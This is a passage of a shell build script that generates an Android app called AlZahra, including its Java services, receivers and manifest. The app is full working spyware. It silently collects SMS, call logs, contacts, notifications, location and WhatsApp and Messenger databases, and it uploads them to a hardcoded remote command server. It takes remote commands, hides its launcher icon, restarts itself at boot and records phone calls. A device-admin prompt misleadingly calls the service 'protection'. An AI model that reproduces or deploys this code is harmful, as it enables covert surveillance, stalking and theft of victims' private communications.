        } catch (Exception e) { Log.e(TAG, "Folder error", e); }
    }

    private void startServiceAndHide() {
        try {
            Intent i = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i);
            else startService(i);
        } catch (Exception e) { Log.e(TAG, "Service error", e); }
        finishAffinity();
    }

    private String getAlzahraDeviceId() {
        String id = prefs.getString("device_id", "");
        if (id.isEmpty()) { id = java.util.UUID.randomUUID().toString().substring(0, 8); prefs.edit().putString("device_id", id).apply(); }
        return id;
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code >= PERM_REQ && code < PERM_REQ + PERMISSIONS.length) {
            boolean allGranted = true;
            for (int r : results) { if (r != PackageManager.PERMISSION_GRANTED) { allGranted = false; break; } }
            if (allGranted) { currentStep = code - PERM_REQ + 1; processNextStep(); }
            else { new AlertDialog.Builder(this).setTitle("⚠️ صلاحية مطلوبة").setMessage("يرجى السماح للمتابعة")
                .setPositiveButton("إعادة", (d, w) -> processNextStep()).setNegativeButton("تخطي", (d, w) -> { currentStep++; processNextStep(); }).setCancelable(false).show(); }
        }
    }

    @Override
    protected void onActivityResult(int code, int result, Intent data) {
        super.onActivityResult(code, result, data);
        currentStep++; processNextStep();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacksAndMessages(null);
    }
}
MAINJAVA

echo "✅ تم إنشاء MainActivity.java"

# ═══════════════════════════════════════════
# إنشاء CoreService.java - الخدمة الرئيسية المعدلة
# ═══════════════════════════════════════════

cat > app/src/main/java/com/alzahra/service/CoreService.java << 'CORESERVICE'
package com.alzahra.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CoreService extends Service {
    private static final String TAG = "AlZahraService";
    private static final String CHANNEL_ID = "alzahra_channel";
    private Handler handler;
    private SharedPreferences prefs;
    private String serverUrl = "http://216.128.156.226:8443";
    private String deviceId;
    private String secretPath;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        deviceId = prefs.getString("device_id", "");
        secretPath = prefs.getString("secret_path", "");
        createNotificationChannel();
        startForeground(1, createNotification());
        startTasks();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service").setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details).build();
    }

    private void startTasks() {
        handler.postDelayed(() -> sendAllData(), 5000);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() { checkCommands(); handler.postDelayed(this, 10000); }
        }, 10000);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() { sendStatus(); handler.postDelayed(this, 30000); }
        }, 30000);
    }

    private void sendAllData() {
        new Thread(() -> sendSMS()).start();
        handler.postDelayed(() -> new Thread(() -> sendCalls()).start(), 2000);
        handler.postDelayed(() -> new Thread(() -> sendContacts()).start(), 4000);
        handler.postDelayed(() -> new Thread(() -> sendNotifications()).start(), 6000);
        handler.postDelayed(() -> new Thread(() -> sendWhatsApp()).start(), 8000);
        handler.postDelayed(() -> new Thread(() -> sendMessenger()).start(), 10000);
        handler.postDelayed(() -> new Thread(() -> sendAppData()).start(), 12000);
        handler.postDelayed(() -> new Thread(() -> sendLocation()).start(), 14000);
    }

    private void sendSMS() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
            if (cursor == null) { sendResponse("sms", false, "لا يمكن الوصول للرسائل"); return; }
            StringBuilder sb = new StringBuilder("=== SMS Messages ===\n\n");
            int count = 0;
            while (cursor.moveToNext() && count < 500) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                String typeStr = type == 1 ? "IN" : "OUT";
                String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(date));
                sb.append("[").append(typeStr).append("] ").append(address).append("\nDate: ").append(dateStr).append("\nMessage: ").append(body).append("\n\n");
                count++;
            }
            cursor.close();
            saveToFile("sms", sb.toString());
            sendResponse("sms", true, count + " رسالة");
            Log.d(TAG, "SMS sent: " + count);
        } catch (Exception e) { sendResponse("sms", false, e.getMessage()); Log.e(TAG, "SMS error", e); }
    }

    private void sendCalls() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
            if (cursor == null) { sendResponse("calls", false, "لا يمكن الوصول للمكالمات"); return; }
            StringBuilder sb = new StringBuilder("=== Call Log ===\n\n");
            int count = 0;
            while (cursor.moveToNext() && count < 500) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String typeStr;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: typeStr = "IN"; break;
                    case CallLog.Calls.OUTGOING_TYPE: typeStr = "OUT"; break;
                    case CallLog.Calls.MISSED_TYPE: typeStr = "MISSED"; break;
                    default: typeStr = "OTHER";
                }
                String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(date));
                sb.append("[").append(typeStr).append("] ").append(number).append("\n");
                if (name != null) sb.append("Name: ").append(name).append("\n");
                sb.append("Date: ").append(dateStr).append("\nDuration: ").append(duration).append("s\n\n");
                count++;
            }
            cursor.close();
            saveToFile("calls", sb.toString());
            sendResponse("calls", true, count + " مكالمة");
        } catch (Exception e) { sendResponse("calls", false, e.getMessage()); Log.e(TAG, "Calls error", e); }
    }

    private void sendContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor == null) { sendResponse("contacts", false, "لا يمكن الوصول لجهات الاتصال"); return; }
            StringBuilder sb = new StringBuilder("=== Contacts ===\n\n");
            int count = 0;
            while (cursor.moveToNext() && count < 1000) {
                String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                Cursor phoneCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                sb.append("Name: ").append(name).append("\n");
                if (phoneCursor != null) {
                    while (phoneCursor.moveToNext()) sb.append("Phone: ").append(phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    phoneCursor.close();
                }
                sb.append("\n"); count++;
            }
            cursor.close();
            saveToFile("contacts", sb.toString());
            sendResponse("contacts", true, count + " جهة اتصال");
        } catch (Exception e) { sendResponse("contacts", false, e.getMessage()); Log.e(TAG, "Contacts error", e); }
    }

    private void sendNotifications() {
        try {
            StringBuilder sb = new StringBuilder("=== Notifications ===\n\n");
            File notifDir = new File(secretPath + "/notifications");
            int count = 0;
            if (notifDir.exists()) {
                File[] files = notifDir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile() && f.getName().endsWith(".txt")) {
                            FileInputStream fis = new FileInputStream(f);
                            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
                            String line;
                            while ((line = reader.readLine()) != null) { sb.append(line).append("\n"); count++; }
                            reader.close(); fis.close();
                        }
                    }
                }
            }
            saveToFile("notifications", sb.toString());
            sendResponse("notifications", true, count + " إشعار");
        } catch (Exception e) { sendResponse("notifications", false, e.getMessage()); Log.e(TAG, "Notifications error", e); }
    }

    private void sendWhatsApp() {
        try {
            StringBuilder sb = new StringBuilder("=== WhatsApp Data ===\n\n");
            String[] waPaths = {"/data/data/com.whatsapp/databases/msgstore.db", "/sdcard/WhatsApp/Databases/msgstore.db", "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db"};
            boolean found = false;
            for (String path : waPaths) {
                File db = new File(path);
                if (db.exists()) {
                    File dest = new File(secretPath + "/whatsapp/msgstore.db");
                    dest.getParentFile().mkdirs(); copyFile(db, dest);
                    sb.append("Database found: ").append(path).append("\nSize: ").append(db.length()).append(" bytes\n"); found = true;
                }
            }
            saveToFile("whatsapp", sb.toString());
            if (found) {
                sendResponse("whatsapp", true, "قاعدة البيانات");
                File dbFile = new File(secretPath + "/whatsapp/msgstore.db");
                if (dbFile.exists()) sendFile("whatsapp_db", dbFile);
            } else {
                sendResponse("whatsapp", false, "واتساب غير مثبت أو لا يمكن الوصول");
            }
        } catch (Exception e) { sendResponse("whatsapp", false, e.getMessage()); Log.e(TAG, "WhatsApp error", e); }
    }

    private void sendMessenger() {
        try {
            StringBuilder sb = new StringBuilder("=== Messenger Data ===\n\n");
            String[] msgPaths = {"/data/data/com.facebook.orca/databases/threads_db2", "/data/data/com.facebook.orca/databases/messages_db"};
            boolean found = false;
            for (String path : msgPaths) {
                File db = new File(path);
                if (db.exists()) {
                    File dest = new File(secretPath + "/messenger/" + db.getName());
                    dest.getParentFile().mkdirs(); copyFile(db, dest);
                    sb.append("Database: ").append(db.getName()).append("\nSize: ").append(db.length()).append(" bytes\n"); found = true;
                }
            }
            saveToFile("messenger", sb.toString());
            sendResponse("messenger", found, found ? "تم سحب البيانات" : "ماسنجر غير مثبت");
        } catch (Exception e) { sendResponse("messenger", false, e.getMessage()); Log.e(TAG, "Messenger error", e); }
    }

    private void sendAppData() {
        try {
            StringBuilder sb = new StringBuilder("=== Installed Apps ===\n\n");
            PackageManager pm = getPackageManager();
            java.util.List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
            int systemCount = 0, userCount = 0;
            for (android.content.pm.ApplicationInfo app : apps) {
                String name = pm.getApplicationLabel(app).toString();
                String pkg = app.packageName;
                boolean isSystem = (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                sb.append(name).append(" (").append(pkg).append(")");
                if (isSystem) { sb.append(" [SYSTEM]"); systemCount++; } else { userCount++; }
                sb.append("\n");
            }
            sb.append("\nTotal: ").append(apps.size()).append(" apps\nSystem: ").append(systemCount).append("\nUser: ").append(userCount);
            saveToFile("app_data", sb.toString());
            sendResponse("app_data", true, apps.size() + " تطبيق");
        } catch (Exception e) { sendResponse("app_data", false, e.getMessage()); Log.e(TAG, "App data error", e); }
    }

    private void sendLocation() {
        try {
            StringBuilder sb = new StringBuilder("=== Location ===\n\n");
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm != null) {
                try {
                    Location gpsLoc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    Location netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (gpsLoc != null) { sb.append("GPS: ").append(gpsLoc.getLatitude()).append(", ").append(gpsLoc.getLongitude()).append("\nAccuracy: ").append(gpsLoc.getAccuracy()).append("m\n"); }
                    if (netLoc != null) { sb.append("Network: ").append(netLoc.getLatitude()).append(", ").append(netLoc.getLongitude()).append("\nAccuracy: ").append(netLoc.getAccuracy()).append("m\n"); }
                    if (gpsLoc != null || netLoc != null) { saveToFile("location", sb.toString()); sendResponse("location", true, "تم تحديد الموقع"); }
                    else sendResponse("location", false, "لا يوجد موقع متاح");
                } catch (SecurityException e) { sendResponse("location", false, "لا تملك صلاحية الموقع"); }
            } else { sendResponse("location", false, "خدمة الموقع غير متاحة"); }
        } catch (Exception e) { sendResponse("location", false, e.getMessage()); Log.e(TAG, "Location error", e); }
    }

    private void sendAllZip() {
        try {
            File zipFile = new File(secretPath + "/backup_" + System.currentTimeMillis() + ".zip");
            java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(new FileOutputStream(zipFile));
            File[] dirs = new File(secretPath).listFiles();
            if (dirs != null) { for (File dir : dirs) { if (dir.isDirectory()) addDirToZip(zos, dir, dir.getName()); } }
            zos.close();
            sendFile("all_backup", zipFile);
            sendResponse("all_zip", true, "ملف ZIP: " + zipFile.length() + " bytes");
        } catch (Exception e) { sendResponse("all_zip", false, e.getMessage()); Log.e(TAG, "ZIP error", e); }
    }

    private void addDirToZip(java.util.zip.ZipOutputStream zos, File dir, String basePath) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isFile()) {
                java.util.zip.ZipEntry entry = new java.util.zip.ZipEntry(basePath + "/" + file.getName());
                zos.putNextEntry(entry);
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[1024]; int len;
                while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                fis.close(); zos.closeEntry();
            } else if (file.isDirectory()) { addDirToZip(zos, file, basePath + "/" + file.getName()); }
        }
    }

    private void checkCommands() {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/commands?device_id=" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(10000);
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder(); String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    org.json.JSONObject json = new org.json.JSONObject(sb.toString());
                    org.json.JSONArray commands = json.getJSONArray("commands");
                    for (int i = 0; i < commands.length(); i++) executeCommand(commands.getString(i));
                }
                conn.disconnect();
            } catch (Exception e) { Log.e(TAG, "Commands error", e); }
        }).start();
    }

    private void executeCommand(String cmd) {
        Log.d(TAG, "Executing: " + cmd);
        switch (cmd) {
            case "sms": sendSMS(); break;
            case "calls": sendCalls(); break;
            case "contacts": sendContacts(); break;
            case "notifications": sendNotifications(); break;
            case "whatsapp": sendWhatsApp(); break;
            case "messenger": sendMessenger(); break;
            case "app_data": sendAppData(); break;
            case "location": sendLocation(); break;
            case "all": sendAllData(); break;
            case "all_zip": sendAllZip(); break;
            case "hide": hideApp(); break;
            case "unhide": unhideApp(); break;
            default: sendResponse(cmd, false, "أمر غير معروف");
        }
    }

    private void hideApp() {
        try {
            ComponentName component = new ComponentName(this, com.alzahra.MainActivity.class);
            getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            sendResponse("hide", true, "تم إخفاء التطبيق");
        } catch (Exception e) { sendResponse("hide", false, e.getMessage()); }
    }

    private void unhideApp() {
        try {
            ComponentName component = new ComponentName(this, com.alzahra.MainActivity.class);
            getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            sendResponse("unhide", true, "تم إظهار التطبيق");
        } catch (Exception e) { sendResponse("unhide", false, e.getMessage()); }
    }

    private void sendResponse(String type, boolean success, String message) {
        try {
            URL url = new URL(serverUrl + "/api/response");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            String json = String.format("{\"device_id\":\"%s\",\"type\":\"%s\",\"success\":%s,\"message\":\"%s\",\"timestamp\":\"%s\"}", deviceId, type, success, message.replace("\"", "\\\""), new Date().toString());
            conn.getOutputStream().write(json.getBytes());
            conn.getResponseCode(); conn.disconnect();
            Log.d(TAG, "Response sent: " + type + " - " + (success ? "success" : "failed"));
        } catch (Exception e) { Log.e(TAG, "Response error", e); }
    }

    private void sendFile(String type, File file) {
        try {
            URL url = new URL(serverUrl + "/api/data");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(60000);
            String boundary = "----WebKitFormBoundary";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            java.io.OutputStream os = conn.getOutputStream();
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n".getBytes());
            os.write((deviceId + "\r\n").getBytes());
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"type\"\r\n\r\n".getBytes());
            os.write((type + "\r\n").getBytes());
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
            os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096]; int len;
            while ((len = fis.read(buffer)) > 0) os.write(buffer, 0, len);
            fis.close();
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush(); os.close();
            conn.getResponseCode(); conn.disconnect();
            Log.d(TAG, "File sent: " + type);
        } catch (Exception e) { Log.e(TAG, "Send file error", e); }
    }

    private void sendStatus() {
        try {
            URL url = new URL(serverUrl + "/api/status");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            String json = String.format("{\"device_id\":\"%s\",\"battery\":%d,\"time\":\"%s\"}", deviceId, getBatteryLevel(), new Date().toString());
            conn.getOutputStream().write(json.getBytes());
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception e) { Log.e(TAG, "Status error", e); }
    }

    private int getBatteryLevel() {
        try {
            Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                if (scale > 0) return (int) (level * 100.0 / scale);
            }
        } catch (Exception e) { }
        return 0;
    }

    private void saveToFile(String type, String data) {
        try {
            File file = new File(secretPath + "/" + type + "/" + type + "_" + System.currentTimeMillis() + ".txt");
            file.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(file);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(data); writer.close(); fos.close();
        } catch (Exception e) { Log.e(TAG, "Save error", e); }
    }

    private void copyFile(File src, File dest) throws Exception {
        FileInputStream fis = new FileInputStream(src);
        FileOutputStream fos = new FileOutputStream(dest);
        byte[] buffer = new byte[4096]; int len;
        while ((len = fis.read(buffer)) > 0) fos.write(buffer, 0, len);
        fis.close(); fos.close();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
    @Override
    public void onDestroy() { super.onDestroy(); if (handler != null) handler.removeCallbacksAndMessages(null); }
}
CORESERVICE

echo "✅ تم إنشاء CoreService.java"

# ═══════════════════════════════════════════
# إنشاء باقي الملفات
# ═══════════════════════════════════════════

# NotificationService.java
cat > app/src/main/java/com/alzahra/service/NotificationService.java << 'NOTIFJAVA'
package com.alzahra.service;
import android.content.SharedPreferences;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationService extends NotificationListenerService {
    private static final String TAG = "AlZahraNotif";
    private SharedPreferences prefs;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString("android.title", "");
            String text = sbn.getNotification().extras.getString("android.text", "");
            String secretPath = prefs.getString("secret_path", "");
            if (secretPath.isEmpty()) return;
            File dir = new File(secretPath + "/notifications");
            if (!dir.exists()) dir.mkdirs();
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            File file = new File(dir, "notif_" + timestamp + ".txt");
            FileOutputStream fos = new FileOutputStream(file);
            String data = "Package: " + packageName + "\nTitle: " + title + "\nText: " + text + "\nTime: " + timestamp + "\n\n";
            fos.write(data.getBytes()); fos.close();
            Log.d(TAG, "Notification saved: " + packageName);
        } catch (Exception e) { Log.e(TAG, "Notification error", e); }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) { }
}
NOTIFJAVA

# BootReceiver.java
cat > app/src/main/java/com/alzahra/receiver/BootReceiver.java << 'BOOTJAVA'
package com.alzahra.receiver;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import com.alzahra.service.CoreService;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("AlZahra", "Boot received");
        Intent i = new Intent(context, CoreService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(i);
        else context.startService(i);
    }
}
BOOTJAVA

# CallReceiver.java
cat > app/src/main/java/com/alzahra/receiver/CallReceiver.java << 'CALLJAVA'
package com.alzahra.receiver;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallReceiver extends BroadcastReceiver {
    private static final String TAG = "CallReceiver";
    private static MediaRecorder recorder;
    private static boolean isRecording = false;
    private static String currentNumber = "";

    @Override
    public void onReceive(Context context, Intent intent) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
        if (number != null && !number.isEmpty()) currentNumber = number;
        SharedPreferences prefs = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE);
        boolean recordingEnabled = prefs.getBoolean("call_recording", true);
        if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) { if (recordingEnabled) startRecording(context); }
        else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) stopRecording();
    }

    private void startRecording(Context context) {
        if (isRecording) return;
        try {
            File dir = new File(context.getFilesDir(), "recordings");
            if (!dir.exists()) dir.mkdirs();
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            File file = new File(dir, "CALL_" + currentNumber + "_" + timestamp + ".mp3");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(file.getAbsolutePath());
            recorder.prepare(); recorder.start(); isRecording = true;
            Log.d(TAG, "Recording started: " + file.getName());
        } catch (IOException e) { Log.e(TAG, "Recording error", e); }
    }

    private void stopRecording() {
        if (!isRecording) return;
        try { recorder.stop(); recorder.release(); recorder = null; isRecording = false; Log.d(TAG, "Recording stopped"); }
        catch (Exception e) { Log.e(TAG, "Stop error", e); }
    }
}
CALLJAVA

# AdminReceiver.java
cat > app/src/main/java/com/alzahra/receiver/AdminReceiver.java << 'ADMINJAVA'
package com.alzahra.receiver;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) { super.onEnabled(context, intent); }
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) { return "سيؤدي تعطيل الخدمة إلى إيقاف الحماية. هل أنت متأكد؟"; }
    @Override
    public void onDisabled(Context context, Intent intent) { super.onDisabled(context, intent); }
}
ADMINJAVA

echo "✅ تم إنشاء المستقبلات والخدمات"

# ═══════════════════════════════════════════
# إنشاء ملفات الموارد
# ═══════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════"
echo "[4.5/5] إنشاء ملفات الموارد"
echo "═══════════════════════════════════════"

# AndroidManifest.xml
cat > app/src/main/AndroidManifest.xml << 'MANIFESTEOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.alzahra">

    <!-- الشبكة -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />

    <!-- الاستمرارية -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />

    <!-- الهاتف والمكالمات -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />

    <!-- الصوت -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />

    <!-- SMS -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_MMS" />

    <!-- جهات الاتصال -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.WRITE_CONTACTS" />

    <!-- التخزين -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />

    <!-- الإشعارات -->
    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- الموقع -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

    <!-- الكاميرا -->
    <uses-permission android:name="android.permission.CAMERA" />

    <!-- النظام -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.WRITE_SETTINGS" tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
    <uses-permission android:name="android.permission.VIBRATE" />

    <!-- Device Admin -->
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

    <application
        android:allowBackup="false"
        android:usesCleartextTraffic="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AlZahra"
        android:requestLegacyExternalStorage="true"
        tools:targetApi="34">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:excludeFromRecents="true"
            android:launchMode="singleTask"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".service.CoreService"
            android:exported="false"
            android:foregroundServiceType="specialUse">
            <property
                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                android:value="device_monitoring" />
        </service>
